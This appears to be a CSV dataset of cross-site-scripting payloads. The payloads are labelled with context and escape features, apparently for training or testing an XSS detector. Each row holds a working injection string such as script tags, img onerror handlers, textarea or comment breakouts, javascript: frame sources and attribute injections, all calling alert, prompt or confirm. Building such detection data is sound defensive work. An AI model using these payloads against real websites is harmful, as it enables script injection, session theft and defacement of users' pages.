op_html,op_attr,op_js,op_vbs,op_quot,esc_double,esc_single,esc_back,esc_left,esc_right,esc_alert,esc_prompt,esc_confirm,esc_balert,esc_sscript,esc_escript,esc_msgbox,label,inspection_strings
2,0,0,0,0,1,0,0,0,0,1,1,0,0,0,0,0,3,[<script>confirm();</script>]
2,0,0,0,0,0,1,0,0,0,1,1,0,0,0,0,0,3,[<script>confirm();</script>]
2,0,0,0,0,0,0,1,0,0,1,1,0,0,0,0,0,3,[<script>confirm();</script>]
2,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,3,[<script>confirm();</script>]
2,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,3,[<script>confirm();</script>]
2,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,3,[<script>confirm();</script>]
2,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,3,[<script>confirm();</script>]
2,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,3,[<script>confirm();</script>]
2,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,3,[<script>confirm();</script>]
2,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,4,[<script>alert``;</script>]
2,0,0,0,0,1,0,0,0,0,1,1,1,0,0,0,0,4,[<script>alert``;</script>]
2,0,0,0,0,0,1,0,0,0,1,1,1,0,0,0,0,4,[<script>alert``;</script>]
2,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,4,[<script>alert``;</script>]
2,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,4,[<script>alert``;</script>]
2,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,4,[<script>alert``;</script>]
2,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,4,[<script>alert``;</script>]
2,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,4,[<script>alert``;</script>]
2,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,4,[<script>alert``;</script>]
2,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,4,[<script>alert``;</script>]
2,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,5,[<img src=x onerror=alert();>]
2,0,0,0,0,1,0,0,0,0,0,0,0,0,1,1,0,5,[<img src=x onerror=alert();>]
2,0,0,0,0,1,1,0,0,0,0,0,0,0,1,1,0,5,[<img src=x onerror=alert();>]
2,0,0,0,0,0,1,0,0,0,0,0,0,0,1,1,0,5,[<img src=x onerror=alert();>]
2,0,0,0,0,0,1,1,0,0,0,0,0,0,1,1,0,5,[<img src=x onerror=alert();>]
2,0,0,0,0,0,0,1,0,0,0,0,0,0,1,1,0,5,[<img src=x onerror=alert();>]
2,0,0,0,0,1,0,1,0,0,0,0,0,0,1,1,0,5,[<img src=x onerror=alert();>]
2,0,0,0,0,1,1,1,0,0,0,0,0,0,1,1,0,5,[<img src=x onerror=alert();>]
2,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,5,[<img src=x onerror=alert();>]
2,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,5,[<img src=x onerror=alert();>]
2,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,6,[<img src=x onerror=prompt();>]
2,0,0,0,0,1,0,0,0,0,1,0,0,0,1,1,0,6,[<img src=x onerror=prompt();>]
2,0,0,0,0,1,1,0,0,0,1,0,0,0,1,1,0,6,[<img src=x onerror=prompt();>]
2,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,0,6,[<img src=x onerror=prompt();>]
2,0,0,0,0,0,1,1,0,0,1,0,0,0,1,1,0,6,[<img src=x onerror=prompt();>]
2,0,0,0,0,0,0,1,0,0,1,0,0,0,1,1,0,6,[<img src=x onerror=prompt();>]
2,0,0,0,0,1,0,1,0,0,1,0,0,0,1,1,0,6,[<img src=x onerror=prompt();>]
2,0,0,0,0,1,1,1,0,0,1,0,0,0,1,1,0,6,[<img src=x onerror=prompt();>]
2,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,6,[<img src=x onerror=prompt();>]
2,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,6,[<img src=x onerror=prompt();>]
2,0,0,0,0,0,0,0,0,0,1,1,0,0,1,1,0,7,[<img src=x onerror=confirm();>]
2,0,0,0,0,1,0,0,0,0,1,1,0,0,1,1,0,7,[<img src=x onerror=confirm();>]
2,0,0,0,0,1,1,0,0,0,1,1,0,0,1,1,0,7,[<img src=x onerror=confirm();>]
2,0,0,0,0,0,1,0,0,0,1,1,0,0,1,1,0,7,[<img src=x onerror=confirm();>]
2,0,0,0,0,0,1,1,0,0,1,1,0,0,1,1,0,7,[<img src=x onerror=confirm();>]
2,0,0,0,0,0,0,1,0,0,1,1,0,0,1,1,0,7,[<img src=x onerror=confirm();>]
2,0,0,0,0,1,0,1,0,0,1,1,0,0,1,1,0,7,[<img src=x onerror=confirm();>]
2,0,0,0,0,1,1,1,0,0,1,1,0,0,1,1,0,7,[<img src=x onerror=confirm();>]
2,0,0,0,0,0,0,0,0,0,1,1,0,0,1,1,0,7,[<img src=x onerror=confirm();>]
2,0,0,0,0,0,0,0,0,0,1,1,0,0,1,1,0,7,[<img src=x onerror=confirm();>]
2,0,0,0,0,0,0,0,0,0,1,1,1,0,1,1,0,8,[<img src=x onerror=alert``;>]
2,0,0,0,0,1,0,0,0,0,1,1,1,0,1,1,0,8,[<img src=x onerror=alert``;>]
2,0,0,0,0,1,1,0,0,0,1,1,1,0,1,1,0,8,[<img src=x onerror=alert``;>]
2,0,0,0,0,0,1,0,0,0,1,1,1,0,1,1,0,8,[<img src=x onerror=alert``;>]
2,0,0,0,0,0,0,0,0,0,1,1,1,0,1,1,0,8,[<img src=x onerror=alert``;>]
2,0,0,0,0,0,0,0,0,0,1,1,1,0,1,1,0,8,[<img src=x onerror=alert``;>]
2,0,0,0,0,0,0,0,0,0,1,1,1,0,1,1,0,8,[<img src=x onerror=alert``;>]
2,0,0,0,0,0,0,0,0,0,1,1,1,0,1,1,0,8,[<img src=x onerror=alert``;>]
2,0,0,0,0,0,0,0,0,0,1,1,1,0,1,1,0,8,[<img src=x onerror=alert``;>]
2,0,0,0,0,0,0,0,0,0,1,1,1,0,1,1,0,8,[<img src=x onerror=alert``;>]
7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,[</textarea><script>alert();</script>]
7,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,9,[</textarea><script>alert();</script>]
7,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,9,[</textarea><script>alert();</script>]
7,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,9,[</textarea><script>alert();</script>]
7,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,9,[</textarea><script>alert();</script>]
7,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,9,[</textarea><script>alert();</script>]
7,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,9,[</textarea><script>alert();</script>]
7,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,9,[</textarea><script>alert();</script>]
7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,[</textarea><script>alert();</script>]
7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,[</textarea><script>alert();</script>]
7,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,10,[</textarea><script>prompt();</script>]
7,0,0,0,0,1,0,0,0,0,1,0,0,0,0,0,0,10,[</textarea><script>prompt();</script>]
7,0,0,0,0,1,1,0,0,0,1,0,0,0,0,0,0,10,[</textarea><script>prompt();</script>]
7,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,0,10,[</textarea><script>prompt();</script>]
7,0,0,0,0,0,1,1,0,0,1,0,0,0,0,0,0,10,[</textarea><script>prompt();</script>]
7,0,0,0,0,0,0,1,0,0,1,0,0,0,0,0,0,10,[</textarea><script>prompt();</script>]
7,0,0,0,0,1,0,1,0,0,1,0,0,0,0,0,0,10,[</textarea><script>prompt();</script>]
7,0,0,0,0,1,1,1,0,0,1,0,0,0,0,0,0,10,[</textarea><script>prompt();</script>]
7,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,10,[</textarea><script>prompt();</script>]
7,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,10,[</textarea><script>prompt();</script>]
7,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,11,[</textarea><script>confirm();</script>]
7,0,0,0,0,1,0,0,0,0,1,1,0,0,0,0,0,11,[</textarea><script>confirm();</script>]
7,0,0,0,0,1,1,0,0,0,1,1,0,0,0,0,0,11,[</textarea><script>confirm();</script>]
7,0,0,0,0,0,1,0,0,0,1,1,0,0,0,0,0,11,[</textarea><script>confirm();</script>]
7,0,0,0,0,0,1,1,0,0,1,1,0,0,0,0,0,11,[</textarea><script>confirm();</script>]
7,0,0,0,0,0,0,1,0,0,1,1,0,0,0,0,0,11,[</textarea><script>confirm();</script>]
7,0,0,0,0,1,0,1,0,0,1,1,0,0,0,0,0,11,[</textarea><script>confirm();</script>]
7,0,0,0,0,1,1,1,0,0,1,1,0,0,0,0,0,11,[</textarea><script>confirm();</script>]
7,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,11,[</textarea><script>confirm();</script>]
7,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,11,[</textarea><script>confirm();</script>]
7,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,12,[</textarea><script>alert``;</script>]
7,0,0,0,0,1,0,0,0,0,1,1,1,0,0,0,0,12,[</textarea><script>alert``;</script>]
7,0,0,0,0,1,1,0,0,0,1,1,1,0,0,0,0,12,[</textarea><script>alert``;</script>]
7,0,0,0,0,0,1,0,0,0,1,1,1,0,0,0,0,12,[</textarea><script>alert``;</script>]
7,0,0,0,0,0,1,1,0,0,1,1,1,0,0,0,0,12,[</textarea><script>alert``;</script>]
7,0,0,0,0,0,0,1,0,0,1,1,1,0,0,0,0,12,[</textarea><script>alert``;</script>]
7,0,0,0,0,1,0,1,0,0,1,1,1,0,0,0,0,12,[</textarea><script>alert``;</script>]
7,0,0,0,0,1,1,1,0,0,1,1,1,0,0,0,0,12,[</textarea><script>alert``;</script>]
7,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,12,[</textarea><script>alert``;</script>]
7,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,12,[</textarea><script>alert``;</script>]
5,3,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,13,"[""><script>alert();</script>]"
5,3,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,13,"[""><script>alert();</script>]"
5,3,0,0,1,0,1,1,0,0,0,0,0,0,0,0,0,13,"[""><script>alert();</script>]"
5,3,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,13,"[""><script>alert();</script>]"
5,3,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,13,"[""><script>alert();</script>]"
5,3,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,13,"[""><script>alert();</script>]"
5,3,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,13,"[""><script>alert();</script>]"
5,3,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,13,"[""><script>alert();</script>]"
5,3,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,13,"[""><script>alert();</script>]"
5,3,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,13,"[""><script>alert();</script>]"
5,3,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,14,"[""><script>prompt();</script>]"
5,3,0,0,1,0,1,0,0,0,1,0,0,0,0,0,0,14,"[""><script>prompt();</script>]"
5,3,0,0,1,0,1,1,0,0,1,0,0,0,0,0,0,14,"[""><script>prompt();</script>]"
5,3,0,0,1,0,0,1,0,0,1,0,0,0,0,0,0,14,"[""><script>prompt();</script>]"
5,3,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,14,"[""><script>prompt();</script>]"
5,3,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,14,"[""><script>prompt();</script>]"
5,3,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,14,"[""><script>prompt();</script>]"
5,3,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,14,"[""><script>prompt();</script>]"
5,3,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,14,"[""><script>prompt();</script>]"
5,3,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,14,"[""><script>prompt();</script>]"
5,3,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,15,"[""><script>confirm();</script>]"
5,3,0,0,1,0,1,0,0,0,1,1,0,0,0,0,0,15,"[""><script>confirm();</script>]"
5,3,0,0,1,0,1,1,0,0,1,1,0,0,0,0,0,15,"[""><script>confirm();</script>]"
5,3,0,0,1,0,0,1,0,0,1,1,0,0,0,0,0,15,"[""><script>confirm();</script>]"
5,3,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,15,"[""><script>confirm();</script>]"
5,3,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,15,"[""><script>confirm();</script>]"
5,3,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,15,"[""><script>confirm();</script>]"
5,3,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,15,"[""><script>confirm();</script>]"
5,3,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,15,"[""><script>confirm();</script>]"
5,3,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,15,"[""><script>confirm();</script>]"
5,3,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,16,"[""><script>alert``;</script>]"
5,3,0,0,1,0,1,0,0,0,1,1,1,0,0,0,0,16,"[""><script>alert``;</script>]"
5,3,0,0,1,0,1,1,0,0,1,1,1,0,0,0,0,16,"[""><script>alert``;</script>]"
5,3,0,0,1,0,0,1,0,0,1,1,1,0,0,0,0,16,"[""><script>alert``;</script>]"
5,3,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,16,"[""><script>alert``;</script>]"
5,3,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,16,"[""><script>alert``;</script>]"
5,3,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,16,"[""><script>alert``;</script>]"
5,3,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,16,"[""><script>alert``;</script>]"
5,3,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,16,"[""><script>alert``;</script>]"
5,3,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,16,"[""><script>alert``;</script>]"
1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,[--><script>alert();</script>]
1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,17,[--><script>alert();</script>]
1,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,17,[--><script>alert();</script>]
1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,17,[--><script>alert();</script>]
1,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,17,[--><script>alert();</script>]
1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,17,[--><script>alert();</script>]
1,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,17,[--><script>alert();</script>]
1,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,17,[--><script>alert();</script>]
1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,[--><script>alert();</script>]
1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,[--><script>alert();</script>]
1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,18,[--><script>prompt();</script>]
1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,0,0,18,[--><script>prompt();</script>]
1,0,0,0,0,1,1,0,0,0,1,0,0,0,0,0,0,18,[--><script>prompt();</script>]
1,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,0,18,[--><script>prompt();</script>]
1,0,0,0,0,0,1,1,0,0,1,0,0,0,0,0,0,18,[--><script>prompt();</script>]
1,0,0,0,0,0,0,1,0,0,1,0,0,0,0,0,0,18,[--><script>prompt();</script>]
1,0,0,0,0,1,0,1,0,0,1,0,0,0,0,0,0,18,[--><script>prompt();</script>]
1,0,0,0,0,1,1,1,0,0,1,0,0,0,0,0,0,18,[--><script>prompt();</script>]
1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,18,[--><script>prompt();</script>]
1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,18,[--><script>prompt();</script>]
1,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,19,[--><script>confirm();</script>]
1,0,0,0,0,1,0,0,0,0,1,1,0,0,0,0,0,19,[--><script>confirm();</script>]
1,0,0,0,0,1,1,0,0,0,1,1,0,0,0,0,0,19,[--><script>confirm();</script>]
1,0,0,0,0,0,1,0,0,0,1,1,0,0,0,0,0,19,[--><script>confirm();</script>]
1,0,0,0,0,0,1,1,0,0,1,1,0,0,0,0,0,19,[--><script>confirm();</script>]
1,0,0,0,0,0,0,1,0,0,1,1,0,0,0,0,0,19,[--><script>confirm();</script>]
1,0,0,0,0,1,0,1,0,0,1,1,0,0,0,0,0,19,[--><script>confirm();</script>]
1,0,0,0,0,1,1,1,0,0,1,1,0,0,0,0,0,19,[--><script>confirm();</script>]
1,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,19,[--><script>confirm();</script>]
1,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,19,[--><script>confirm();</script>]
1,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,20,[--><script>alert``;</script>]
1,0,0,0,0,1,0,0,0,0,1,1,1,0,0,0,0,20,[--><script>alert``;</script>]
1,0,0,0,0,1,1,0,0,0,1,1,1,0,0,0,0,20,[--><script>alert``;</script>]
1,0,0,0,0,0,1,0,0,0,1,1,1,0,0,0,0,20,[--><script>alert``;</script>]
1,0,0,0,0,0,1,1,0,0,1,1,1,0,0,0,0,20,[--><script>alert``;</script>]
1,0,0,0,0,0,0,1,0,0,1,1,1,0,0,0,0,20,[--><script>alert``;</script>]
1,0,0,0,0,1,0,1,0,0,1,1,1,0,0,0,0,20,[--><script>alert``;</script>]
1,0,0,0,0,1,1,1,0,0,1,1,1,0,0,0,0,20,[--><script>alert``;</script>]
1,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,20,[--><script>alert``;</script>]
1,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,20,[--><script>alert``;</script>]
3,2,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,21,"[""><frame src=""javascript:alert()"">]"
3,2,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,21,"[""><frame src=""javascript:alert()"">]"
3,2,0,0,1,0,1,1,0,0,0,0,0,0,0,0,0,21,"[""><frame src=""javascript:alert()"">]"
3,2,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,21,"[""><frame src=""javascript:alert()"">]"
3,2,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,21,"[""><frame src=""javascript:alert()"">]"
3,2,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,21,"[""><frame src=""javascript:alert()"">]"
3,2,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,21,"[""><frame src=""javascript:alert()"">]"
3,2,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,21,"[""><frame src=""javascript:alert()"">]"
3,2,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,21,"[""><frame src=""javascript:alert()"">]"
3,2,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,21,"[""><frame src=""javascript:alert()"">]"
3,2,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,22,"[""><frame src=""javascript:prompt()"">]"
3,2,0,0,1,0,1,0,0,0,1,0,0,0,0,0,0,22,"[""><frame src=""javascript:prompt()"">]"
3,2,0,0,1,0,1,1,0,0,1,0,0,0,0,0,0,22,"[""><frame src=""javascript:prompt()"">]"
3,2,0,0,1,0,0,1,0,0,1,0,0,0,0,0,0,22,"[""><frame src=""javascript:prompt()"">]"
3,2,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,22,"[""><frame src=""javascript:prompt()"">]"
3,2,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,22,"[""><frame src=""javascript:prompt()"">]"
3,2,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,22,"[""><frame src=""javascript:prompt()"">]"
3,2,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,22,"[""><frame src=""javascript:prompt()"">]"
3,2,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,22,"[""><frame src=""javascript:prompt()"">]"
3,2,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,22,"[""><frame src=""javascript:prompt()"">]"
3,2,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,23,"[""><frame src=""javascript:confirm()"">]"
3,2,0,0,1,0,1,0,0,0,1,1,0,0,0,0,0,23,"[""><frame src=""javascript:confirm()"">]"
3,2,0,0,1,0,1,1,0,0,1,1,0,0,0,0,0,23,"[""><frame src=""javascript:confirm()"">]"
3,2,0,0,1,0,0,1,0,0,1,1,0,0,0,0,0,23,"[""><frame src=""javascript:confirm()"">]"
3,2,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,23,"[""><frame src=""javascript:confirm()"">]"
3,2,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,23,"[""><frame src=""javascript:confirm()"">]"
3,2,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,23,"[""><frame src=""javascript:confirm()"">]"
3,2,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,23,"[""><frame src=""javascript:confirm()"">]"
3,2,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,23,"[""><frame src=""javascript:confirm()"">]"
3,2,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,23,"[""><frame src=""javascript:confirm()"">]"
3,2,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,24,"[""><frame src=""javascript:alert``"">]"
3,2,0,0,1,0,1,0,0,0,1,1,1,0,0,0,0,24,"[""><frame src=""javascript:alert``"">]"
3,2,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,24,"[""><frame src=""javascript:alert``"">]"
3,2,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,24,"[""><frame src=""javascript:alert``"">]"
3,2,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,24,"[""><frame src=""javascript:alert``"">]"
3,2,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,24,"[""><frame src=""javascript:alert``"">]"
3,2,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,24,"[""><frame src=""javascript:alert``"">]"
3,2,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,24,"[""><frame src=""javascript:alert``"">]"
3,2,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,24,"[""><frame src=""javascript:alert``"">]"
3,2,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,24,"[""><frame src=""javascript:alert``"">]"
4,2,0,0,1,0,0,0,1,1,0,0,0,0,0,0,0,25,"["" onerror=alert();""]"
4,2,0,0,1,0,1,0,1,1,0,0,0,0,0,0,0,25,"["" onerror=alert();""]"
4,2,0,0,1,0,1,1,1,1,0,0,0,0,0,0,0,25,"["" onerror=alert();""]"
4,2,0,0,1,0,0,1,1,1,0,0,0,0,0,0,0,25,"["" onerror=alert();""]"
4,2,0,0,1,0,0,0,1,1,0,0,0,0,0,0,0,25,"["" onerror=alert();""]"
4,2,0,0,1,0,0,0,1,1,0,0,0,0,0,0,0,25,"["" onerror=alert();""]"
4,2,0,0,1,0,0,0,1,1,0,0,0,0,0,0,0,25,"["" onerror=alert();""]"
4,2,0,0,1,0,0,0,1,1,0,0,0,0,0,0,0,25,"["" onerror=alert();""]"
4,2,0,0,1,0,0,0,1,1,0,0,0,0,0,0,0,25,"["" onerror=alert();""]"
4,2,0,0,1,0,0,0,1,1,0,0,0,0,0,0,0,25,"["" onerror=alert();""]"
4,2,0,0,1,0,0,0,1,1,1,0,0,0,0,0,0,26,"["" onerror=prompt();""]"
4,2,0,0,1,0,1,0,1,1,1,0,0,0,0,0,0,26,"["" onerror=prompt();""]"
4,2,0,0,1,0,1,1,1,1,1,0,0,0,0,0,0,26,"["" onerror=prompt();""]"
4,2,0,0,1,0,0,1,1,1,1,0,0,0,0,0,0,26,"["" onerror=prompt();""]"
4,2,0,0,1,0,0,0,1,1,1,0,0,0,0,0,0,26,"["" onerror=prompt();""]"
4,2,0,0,1,0,0,0,1,1,1,0,0,0,0,0,0,26,"["" onerror=prompt();""]"
4,2,0,0,1,0,0,0,1,1,1,0,0,0,0,0,0,26,"["" onerror=prompt();""]"
4,2,0,0,1,0,0,0,1,1,1,0,0,0,0,0,0,26,"["" onerror=prompt();""]"
4,2,0,0,1,0,0,0,1,1,1,0,0,0,0,0,0,26,"["" onerror=prompt();""]"
4,2,0,0,1,0,0,0,1,1,1,0,0,0,0,0,0,26,"["" onerror=prompt();""]"
4,2,0,0,1,0,0,0,1,1,1,1,0,0,0,0,0,27,"["" onerror=confirm();""]"
4,2,0,0,1,0,1,0,1,1,1,1,0,0,0,0,0,27,"["" onerror=confirm();""]"
4,2,0,0,1,0,1,1,1,1,1,1,0,0,0,0,0,27,"["" onerror=confirm();""]"
4,2,0,0,1,0,0,1,1,1,1,1,0,0,0,0,0,27,"["" onerror=confirm();""]"
